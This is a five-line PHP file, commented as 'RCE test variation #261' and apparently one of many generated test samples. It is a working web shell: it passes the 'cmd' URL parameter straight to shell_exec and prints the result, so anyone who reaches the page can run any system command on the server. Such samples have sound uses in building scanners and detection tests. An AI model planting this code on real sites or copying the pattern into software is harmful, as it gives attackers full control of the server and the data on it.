<?php
// RCE test variation #261
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>